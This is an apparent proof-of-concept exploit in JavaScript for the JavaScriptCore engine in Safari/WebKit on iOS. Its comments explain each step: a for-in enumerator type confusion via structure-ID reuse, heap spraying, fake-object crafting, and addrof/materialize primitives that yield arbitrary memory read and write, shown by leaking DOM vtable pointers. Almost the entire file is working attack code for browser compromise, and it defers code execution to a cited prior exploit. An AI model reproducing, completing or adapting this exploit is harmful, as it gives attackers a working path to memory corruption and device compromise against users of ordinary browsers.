using('libbinhelper');
var STRUCT_ID = 0x800;
var ZONE = 0x2F;
var ZONE_SPAM = 0x40;

// Arbitrary r/w, addrof/matrialize helper taken from [1].
var iRW = function (boxed, unboxed, idx) {
    this.boxed   = boxed;
    this.unboxed = unboxed;
    this.idx  = idx;

    let slavePad = new Array(0x10);

    for (var i=0; i<slavePad.length; i++) {
        let f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
        p6:bh.toF64JSValue(0x10000, 0x10000)};  
        slavePad[i] = f;
    }
    let slave = slavePad.pop();
    slave[0] = 1.1;
    slave.X = 1.1;

    let cellArrDouble = bh.toF64JSValue(0x01082107, STRUCT_ID);

    let container = {};
    container.p0 = cellArrDouble;
    container.p1 = slave;

    let caddr = this.addrof(container);

    let master  = this.materialize(bh.f64AddU32(caddr, 0x10));

    this.slave     = slave;
    this.master    = master;
    this.container = container;
    this.slaveBfly = master[1];

    this.remaster();
}

iRW.prototype.addrof = function (o) {
    this.boxed[0] = o;
    return this.unboxed[this.idx];
}

iRW.prototype.materialize = function (a) {
    this.unboxed[this.idx] = a;
    return this.boxed[0];
}

iRW.prototype.write64 = function (a, v) {
    // overwrite slaves buterfly
    this.master[1] = bh.f64AddU32(a, 0x10);
    this.slave.X = this.materialize(v);
    this.master[1] = this.slaveBfly;
}

iRW.prototype.read64 = function(a) {
    let addr = bh.f64AddU32(a, 0x10);
    this.master[1] = addr;
    let ret = this.addrof(this.slave.X);
    this.master[1] = this.slaveBfly;
    return ret;
}

// change master's cell to an unboxed array with no properties
// which is going to help us survive garbage collection
// in case we need it. 
iRW.prototype.remaster = function() {
    let unboxed = [];
    unboxed[0] = 1.1;

    let cell = this.read64AtObj(unboxed);
    this.container.p0 = bh.f64JSValue(cell);
}

iRW.prototype.read64AtObj = function(o, off=0) {
    let a = this.addrof(o);
    a = bh.f64AddU32(a, off);
    return this.read64(a);
}

iRW.prototype.test = function() {
    let o = [];
    o[0] = 1.1;
    let bfly = this.read64AtObj(o, 8);

    this.write64(bfly, 2.2);
    let x1 = this.read64(bfly);

    return x1 === 2.2;
}

function print(msg) {
    document.write(msg);
}

// triggers garbage collection
function __gc() {
    for (var i=0; i<0x100; i++) {
        new Uint32Array(0x100 * 0x100);
    }
}

var evil_function = function (tmp, refill) {
    // modify tmp structure, so we can refill 
    tmp.__proto__ = {};
    __gc();
    // clain former structure of tmp
    refill.__proto__ = {};
}

function foo(tmp, refill) {

    var result=0;
    var i=0;
    for (let k in tmp) {
        if (i > 0) {
            evil_function(tmp, refill);
        }
        // if i > 0, at this point refill has the same
        // structure as tmp had before, meaning
        // the id check is going to pass
        // and m_cachedInlineCapacity is going to be 
        // used to read k as an inline property on refill
        result = refill[k];
        i++;
    }

    return result;
}

var pwn = function()
{
    __gc();
    // force JavaScriptCore to produce baseline jit for foo
    for (var i=0; i<100; i++) {
        foo({a:1.1}, {a:1.1});
    }
    let cellArrDouble = bh.toF64JSValue(0x01082107, STRUCT_ID);

    // craft an object which we are going to get r/w on. It should be prepender
    // by a proper butterfly header, so we spam some objects before
    // with | 0x10001 | 0x10000 | as the last property placed right before
    // our target forming a butterfly header with both the capacity 
    // the and public length 0x10001
    var objs = [];
    for (var i=0; i<0x100; i++) {
        f = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
        p6:bh.toF64JSValue(0x10001, 0x10001)};  
        objs[i] = f;
    }
    let unboxed = {p:1.1, p2:1.1, p3:1.1, p4:1.1, p5:1.1, 
        p6:bh.toF64JSValue(0x10001, 0x10001)};

    // spam arrays one after another so we have the butterfly 
    // at the position where enumerator expects a property,
    // so it gets interpreted as a javascript object
    // 
    // 0           8               0x10        0x18             0x20 
    // | arr1 cell | arr1 butterfly | arr2 cell | arr2 butterfly | ...
    var largeSpam = new Array(0x1000);
    for (var i=0; i<largeSpam.length; i++) {
        // allocate butterfly in large allocations space
        // so the address is 0x10 aligned, since all object
        // addresses must be 0x10 aligned in JavaScriptCore 
        var arr = new Array(0x400); 
        // arrange fake object in the butterfly
        // cell for the fake array
        arr[0] = cellArrDouble;
        // object we want to get a r/w is used as a butterfly
        arr[1] = unboxed;
        largeSpam[i] = arr;
    }

    // pick an array from the middle of the spammed area, for
    // the foo second argument
    refill = largeSpam[largeSpam.length/2];
    var structs = new Array(STRUCT_ID*2);

    // This serves two purposes. Firstly, we spam enough structures so
    // we can guess the structure id for our fake object. Secondly, we
    // want exhaust the pool of available structure ids. This comes 
    // handy when we need to refill the freed structure of object o.
    // 
    // Trigger the garbage collection so we don't have any unreferenced
    // object holding on to a structure id, since we need them aligned later on.
    __gc();
    for (var i=0; i<structs.length; i++) {
        let z = [];
        z[0] = 1.1;
        z["p"+i] = 1.1;
        structs[i] = z;
    }

    // Create an object with two inlined properties.
    target = {b:1.1, c: 1.1};
    // This one I did not quite figured out, just took it from the sample.
    // But, after some experiments, with  JavaScriptCore it turned out it 
    // has the following useful property.
    //
    // After reassigning __proto__ for the second time and triggering 
    // the garbage collection it's possible to reuse the initial object's
    // structure id. So here we reassign __proto__ the first time and
    // later on in evil_function to be able to reuse it.
    target.__proto__ = {};

    // Trigger the bug and materialize our fake array.
    var fakeDoubleArr = foo(target, refill, true);

    if (fakeDoubleArr == undefined) {
        print("could not spawn fake double, bailing ...");
        throw new Error(":'(");
    }

    //alert(bh.f64ToStr(fakeDoubleArr));

    // spam boxed arrays with the same butterfly size
    // as we are planning to allocate for unboxed,
    // so the unboxed butterfly ends up in the same allocation zone,
    // and is followed by a butterfly of boxed array
    var arrs = new Array(0x100);
    for (var i=0; i<ZONE_SPAM; i++) {
        var a = {};
        a[ZONE] = {};
        // we place (0x4141,i) touples, so later on
        // we can detect which butterfly was placed after our
        // butterfly with out of bound read/write
        a[0] = bh.toF64(0x4141, i);
        arrs[i] = a;
    }

    // Assign a double to allocate buttefly with unboxed
    // doubles
    unboxed[ZONE] = 1.1;

    // print the newly allocated butterfly of unboxed object
    print("bfly: " + bh.f64ToStr(fakeDoubleArr[1]));

    // now we are going to shift unboxed butterfly by +0x10 relative to
    // the original one and craft the buterfly header at +8,
    // set its length to 0x10001, so we get  out of bound read/write into
    // the area filled with boxed arrays butterflies we have access to.
    //
    // -8                  0        8        0xc       0x10
    //  | butterfly header |  el0   | 0x10001 | 0x10001 |  new butterfly items ...
    unboxed[1] = bh.toF64(0x10001, 0x10001);
    fakeDoubleArr[1] = bh.f64AddU32(fakeDoubleArr[1], 0x10);

    // spam more to make sure we grab the area after unboxed butterfly
    for (var i=ZONE_SPAM; i<ZONE_SPAM*2; i++) {
        var a = {};
        a[ZONE] = {};
        // place a unique value for each array to be able to id it later
        a[0] = bh.toF64(0x4141, i);
        arrs[i] = a;
    }

    var boxed = null;
    var magicIdx = 0;

    // now using out of bound read we locate the boxed array 
    // we can read and write unboxed dobles to via unboxed.
    for (var i=0; i<ZONE*4; i++) {
        if (unboxed[i]) {
            let hi = bh.f64hi(unboxed[i]);
            // check for our magic value
            if (hi == 0x14141) {
                let lo = bh.f64lo(unboxed[i]);
                boxed = arrs[lo];
                magicIdx = i;
                break;
            }
        }
    }

    // now we can leak an arbitrary object address by placing
    // it into boxed 0 and then reading at magicIdx from unboxed,
    // and materialize a fake object by placing the address 
    // into unboxed at magicIdx and then reading it via boxed[0].

    // Having obtained addrof and materialize a fake object primitives, we craft
    // arbitrary read/write the same way as in Safari exploit
    // [1] https://github.com/phoenhex/files/tree/master/exploits/ios-11.3.1
    // by @_niklasb.
    print("magic: " + magicIdx.toString(16));
    let rw = new iRW(boxed, unboxed, magicIdx);

    // make sure our arbitrary read/write works
    print("rw test: " + rw.test());

    // Read some vtables, you should be able to see
    // authenticated pointer if you are on XS.
    var wrapper = document.createElement('div')

    var el = rw.read64AtObj(wrapper, 0x18);
    alert("el: " + bh.f64ToStr(el));

    var vtable = rw.read64(el);
    alert("vtable: " + bh.f64ToStr(vtable));

    let fn = rw.read64(vtable);
    fn = rw.read64(vtable);
    alert("fn: " + bh.f64ToStr(fn));

    let inst = rw.read64(fn);
    alert("inst: " + bh.f64ToStr(inst));

    // to get code execution refer to [1] for iPhones up to XS, 
    // XS models will require a different approach ...

    // Die, since we have fake object still referenced by the foo function,
    // so the garbage collection is going to try to walk
    // it causing a crash. There might be some other reasons as well ...
}

function wk1201go()
{
    try{
        pwn();
    } catch(exception) {
        alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
    }
};

